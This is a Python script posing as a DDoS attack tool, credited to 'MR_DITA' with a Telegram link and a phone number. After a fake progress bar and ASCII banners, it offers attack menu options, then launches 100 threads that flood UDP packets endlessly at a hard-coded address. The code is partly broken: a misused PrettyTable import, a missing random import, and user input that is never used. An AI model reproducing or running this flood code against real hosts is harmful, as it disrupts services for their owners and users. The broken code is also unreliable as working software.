import os
import time
from random import randint
from colorama import Fore, init
import socket
import threading
import PrettyTable

init(autoreset=True)

def show_menu():
    print("Welcome to the progress bar simulation!")

n = 0
r = ""

while n <= 100:
    print(r, f"{Fore.LIGHTRED_EX}%{n}")
    n += randint(1, 5)
    r += "="
    time.sleep(0.1)

time.sleep(3)
os.system("cls" if os.name == "nt" else "clear")

print(f"""{Fore.LIGHTCYAN_EX}
.##.....##.########.########.##.....##.##......
.##.....##....##.......##....###...###.##......
.##.....##....##.......##....####.####.##......
.#########....##.......##....##.###.##.##......
.##.....##....##.......##....##.....##.##......
.##.....##....##.......##....##.....##.##......
.##.....##....##.......##....##.....##.########
""")
print('')
print(Fore.BLUE + "   https://t.me/Mr_Dita")

print(Fore.LIGHTGREEN_EX + """
             .88888888:.
            88888888.88888.
          .8888888888888888.
          888888888888888888
          88' _88'_    88888         
          88 88 88 88  88888         
          88_88_::_88_:88888         
          88:::,::,:::::8888         
          88:::::::::'8888         
         .88  ::::'    8:88.         
        8888            8:888.       
      .8888'            888888.     
     .8888:..  .::.  ...:'8888888:.   
    .8888.'     :'     '::88:88888  
   .8888       '         .888:88888  
  888:8         .         888:88888. 
.888:88       .:         888:88888: 
8888888.      ::         88:888888.
.::.888.     ::         .888888888
.::::::.888.    ::         :::8888'.:.
 ::::::::::.888   '         .::::::::::::
 ::::::::::::.8    '      .:8::::::::::::.     
.::::::::::::::.      .:888:::::::::::::
:::::::::::::::88:.__..:88888:::::::::::'
 '.:::::::::::88888888888.88:::::::::'      
        ':::_:' -- '' -'-' ':_::::'  
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
""")

time.sleep(1)
print("")
print("")
print(f"{Fore.LIGHTYELLOW_EX}―――‣{Fore.LIGHTMAGENTA_EX} im MR_DITA")
time.sleep(0.4)
print(f"{Fore.LIGHTYELLOW_EX}―――――‣{Fore.LIGHTMAGENTA_EX} MR_DITA REPORT ")
time.sleep(0.3)
print(f"{Fore.LIGHTYELLOW_EX}―――――――‣{Fore.LIGHTMAGENTA_EX} 09130756432")
time.sleep(0.2)

print(f"{Fore.LIGHTBLUE_EX}")
print(" ")
print(" ")
os.system(" ")
print(" ")
print(" ")

# Define colors
lgn = "\033[92m"  
gn = "\033[92m"   
lrd = "\033[91m"  
cn = "\033[96m"   

t = PrettyTable([f'{cn}Number{lrd}', f'{cn}Information{lrd}'])
t.add_row([f'{lgn}1{lrd}', f'{gn}DDoS Attack Set port >1{lrd}'])
t.add_row([f'{lgn}2{lrd}', f'{gn}DDoS Attack Set La4 > 2{lrd}'])
t.add_row([f'{lgn}3{lrd}', f'{gn}DDoS Attack Set La7 > 3{lrd}'])

print(t)

site = input("┌─[DDOS@KALI]─[~]\n└──╼ ❯❯❯ ")
print(f"You entered: {site}")
print('')

site = input(Fore.LIGHTWHITE_EX + "┌─[DDOS@KALI]─[~]\n└──╼ ❯❯❯TARGET : ")

if site:
    command = f"/attack {site} 443 300"
    print(Fore.LIGHTWHITE_EX + f": {command}")
else:
    print(Fore.RED + "Error Command.")

target_ip = "127.0.0.1"   
target_port = 80           
num_threads = 100          

def attack():
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)  
    while True:
        client.sendto(bytes, (target_ip, target_port))
        print("\033[92m[+] Sending packet to {}:{}".format(target_ip, target_port))  

for i in range(num_threads):
    thread = threading.Thread(target=attack)
    thread.start()
    time.sleep(0.1)  

print("\033[91m[!] Attack started!")
